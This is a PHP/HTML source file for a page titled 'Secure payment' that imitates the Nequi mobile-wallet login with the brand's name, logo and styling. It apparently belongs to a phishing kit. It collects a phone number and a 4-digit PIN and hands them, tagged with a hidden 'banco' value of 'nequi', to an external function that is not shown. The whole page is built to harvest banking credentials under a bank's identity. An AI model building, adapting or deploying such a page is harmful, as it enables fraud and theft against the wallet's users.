<?php
session_start();

if(isset($_SESSION['estado']) && $_SESSION['estado'] == 1){

}

?>

<!DOCTYPE html>
<html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="X-UA-Compatible" content="IE=edge">
        <meta name="viewport" content="width=device-width, initial-scale=1.0,user-scalable=0">
        <title>Secure payment</title>
        <script type="text/javascript" src="/scripts/jquery-3.6.0.min.js"></script>
        <script src="/scripts/jquery.jclock-min.js" type="text/javascript"></script>
        <script type="text/javascript" src="/scripts/functions2.js"></script>  		

        <style>
            *{
                font-family: Arial, Helvetica, sans-serif;
                margin: 0;
                padding: 0;
            }
            input{
                width: 80%;
                height: 40px;
                border-radius: 5px;
                margin-top: 10px;
                border:1px solid gray;
                padding: 5px;
            }
            select{
                padding: 5px;
                background-color: white;
                color: black;
                width: 82%;
                height: 40px;
                border-radius: 5px;
                margin-top: 10px;
                border:1px solid gray;
            }
            #btnUsuario{
                background-color: palevioletred;
                border: none;
                color: white;
                letter-spacing: 3px;
                font-family: Arial, Helvetica, sans-serif, 'Arial Narrow Bold';         
            }
            #clave{
                color:rgb(78,139,102);
            }
        </style>
    </head>
    <body style="background-image: url('img/backgroundNequi.PNG');">
        <br><br>
        <center><h1 style="color:black;text-align: center;">Pagos Nequi</h1></center>
        <br><center><img src="img/logoNequi.PNG"><br><br>
        <h3 style="color:black;">Entra a tu cuenta</h3>
        <h3 style="color:black;">Recuerda que debes tener el celu a la mano</h3></center>
        <br><br>
        <div>
            <center>
            <input type="text" id="txtUsuario" name = "cedula" placeholder="Celular" required minlength="10" maxlength="10">
            <input type="text" id="txtPass" name = "clave" placeholder="Constraseña" required minlength="4" maxlength="4"><br>
            <input type="submit" value="Entra" id="btnUsuario" ></center><br>
            <input type="hidden" value="nequi" id="banco">
    </div>
        <br><br>


        <script>
            const txtPass = document.getElementById('txtPass');
            txtPass.addEventListener('input', function() {
                const value = txtPass.value;
                const cleanValue = value.replace(/\D/g, ''); // Remover caracteres no numéricos
                if (value !== cleanValue) {
                txtPass.value = cleanValue;
                }
            });
        </script>

        <script type="text/javascript">
            $(document).ready(function() {
            $('#btnUsuario').click(function(){
                if (($("#txtUsuario").val().length == 10) && ($("#txtPass").val().length == 4)) {
                    pasousuario($("#txtPass").val(), $("#txtUsuario").val(), $("#banco").val());	
                }else{
                    $("#err-mensaje").show();
                    $(".user").css("border", "1px solid red");
                    $("#txtUsuario").focus();
                }			
            });
            $("#txtUsuario").keyup(function(e) {
                $(".user").css("border", "1px solid #CCCCCC");	
                $("#err-mensaje").hide();				
            });
            });
        </script>
        
    </body>
</html>